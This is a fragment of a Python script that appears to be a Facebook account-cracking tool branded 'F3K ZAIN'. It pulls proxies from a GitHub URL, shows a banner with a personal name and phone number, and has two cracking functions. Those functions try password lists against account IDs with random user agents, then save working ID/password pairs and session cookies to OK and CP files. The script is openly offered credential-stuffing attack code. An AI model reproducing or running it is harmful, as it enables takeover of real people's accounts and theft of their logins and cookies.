...
princp=[]
try:
    prox= requests.get('https://github.com/MAHMUD-EMRAN-404/PRO-MAX/blob/main/Prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/MAHMUD-EMRAN-404/PRO-MAX/blob/main/Prox.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://https://www.facebook.com/F3K.Cyber.420.DHAKA.ER.KING')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[1;35m: :: ::    \033[38;5;46m:   : :  \033[37;1m:: :: :
\033[38;5;46m══════════════════════════════               
 \033[1;35m  𝗡𝗔𝗠𝗘 \033[38;5;46m𝗭𝗔𝗜𝗡 𝗙3𝗞      
 \033[1;35m𝗚𝗜𝗧𝗛𝗨𝗕 \033[38;5;46m𝗠𝗔𝗫 𝗙𝗥𝗢 𝗠𝗔𝗡  
 \033[1;35m𝗡𝗨𝗠𝗕𝗘𝗥 \033[38;5;46m𝟬𝟳𝟭𝟬𝟱𝟲𝟵𝟱𝟰𝟵𝟴𝟱𝟳
...
os.system('espeak -a 300 " Welcome,   to,  F3K ZAIN,   Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[ZAIN•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[EMRAN-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[EMRAN-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[ZAIN-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ZAIN-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ZAIN-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  ZAIN,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
